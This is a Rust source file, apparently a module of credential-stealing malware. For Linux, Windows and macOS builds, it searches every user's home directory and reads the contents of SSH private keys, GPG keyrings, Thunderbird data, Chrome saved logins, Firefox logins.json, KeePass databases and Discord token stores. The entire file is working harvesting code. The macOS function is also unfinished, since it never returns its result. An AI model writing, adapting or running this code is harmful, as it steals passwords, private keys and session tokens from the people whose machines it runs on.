/* File containing all the functions used to retrieve information from the system
Based on the chosen OS, different functions will be compiled into the binary*/
use glob::glob;
use std::collections::HashMap;
extern crate file;

#[cfg(feature = "linux")]
pub fn get_info() -> HashMap<String, String> {
    let mut infos: HashMap<String, String> = HashMap::new();
    if let Some(ssh_keys) = get_files_from_glob_path("/home/*/.*ssh/id_*") {
        infos.insert(String::from("SSH keys"), ssh_keys);
    }
    if let Some(gpg_keys) = get_files_from_glob_path("/home/*/.*gnupg/*.gpg") {
        infos.insert(String::from("GPG keys"), gpg_keys);
    }
    if let Some(gmail_keys) = get_files_from_glob_path("/home/*/.*thunderbird/*.sbd/*.msf") {
        infos.insert(String::from("Gmail keys"), gmail_keys);
    }
    if let Some(chrome_keys) =
        get_files_from_glob_path("/home/*/.*config/google-chrome/Default/Login Data")
    {
        infos.insert(String::from("Chrome keys"), chrome_keys);
    }
    if let Some(firefox_keys) =
        get_files_from_glob_path("/home/*/.*mozilla/firefox/*.default*/logins.json")
    {
        infos.insert(String::from("Firefox keys"), firefox_keys);
    }
    if let Some(keepass_keys) = get_files_from_glob_path("/home/*/.*keepass*/**/*.kdbx") {
        infos.insert(String::from("Keepass keys"), keepass_keys);
    }
    if let Some(keepass_keys) = get_files_from_glob_path("/home/*/.*keepass*/**/*.kdb") {
        infos.insert(String::from("Keepass keys"), keepass_keys);
    }
    if let Some(discord_keys) =
        get_files_from_glob_path("/home/*/.*config/discord/Local Storage/leveldb/*.ldb")
    {
        infos.insert(String::from("Discord keys"), discord_keys);
    }
    infos
}

#[cfg(feature = "windows")]
pub fn get_info() -> HashMap<String, String> {
    let mut infos: HashMap<String, String> = HashMap::new();
    if let Some(ssh_keys) = get_files_from_glob_path("C:/Users/*/.*ssh/id_*") {
        infos.insert(String::from("SSH keys"), ssh_keys);
    }
    if let Some(gpg_keys) = get_files_from_glob_path("C:/Users/*/.*gnupg/*.gpg") {
        infos.insert(String::from("GPG keys"), gpg_keys);
    }
    if let Some(gmail_keys) = get_files_from_glob_path("C:/Users/*/.*thunderbird/*.sbd/*.msf") {
        infos.insert(String::from("Gmail keys"), gmail_keys);
    }
    if let Some(chrome_keys) =
        get_files_from_glob_path("C:/Users/*/.*config/google-chrome/Default/Login Data")
    {
        infos.insert(String::from("Chrome keys"), chrome_keys);
    }
    if let Some(firefox_keys) =
        get_files_from_glob_path("C:/Users/*/.*mozilla/firefox/*.default*/logins.json")
    {
        infos.insert(String::from("Firefox keys"), firefox_keys);
    }
    if let Some(keepass_keys) = get_files_from_glob_path("C:/Users/*/.*keepass*/**/*.kdbx") {
        infos.insert(String::from("Keepass keys"), keepass_keys);
    }
    if let Some(keepass_keys) = get_files_from_glob_path("C:/Users/*/.*keepass*/**/*.kdb") {
        infos.insert(String::from("Keepass keys"), keepass_keys);
    }
    if let Some(discord_keys) =
        get_files_from_glob_path("C:/Users/*/.*config/discord/Local Storage/leveldb/*.ldb")
    {
        infos.insert(String::from("Discord keys"), discord_keys);
    }
    infos
}

#[cfg(feature = "macos")]
pub fn get_info() -> HashMap<String, String> {
    let mut infos: HashMap<String, String> = HashMap::new();
    if let Some(ssh_keys) = get_files_from_glob_path("/Users/*/.*ssh/id_*") {
        infos.insert(String::from("SSH keys"), ssh_keys);
    }
    if let Some(gpg_keys) = get_files_from_glob_path("/Users/*/.*gnupg/*.gpg") {
        infos.insert(String::from("GPG keys"), gpg_keys);
    }
}

/* Generic function retrieving the contents of all files matching a specified input  */
fn get_files_from_glob_path(glob_path: &str) -> Option<String> {
    let mut result: String = String::from("");
    if let Ok(glob) = glob(&glob_path) {
        for entry in glob {
            println!("Found: {:?}", entry);
            match entry {
                Ok(path) => {
                    // file matching id_*
                    if let Ok(s) = file::get_text(&path) {
                        result.push_str(path.as_os_str().to_str().unwrap_or_else(|| "file:"));
                        result.push_str(" ");
                        result.push_str(&s);
                        result.push_str("\n");
                    }
                }
                Err(_) => (), // other files
            }
        }
        return Some(result);
    }
    return None;
}
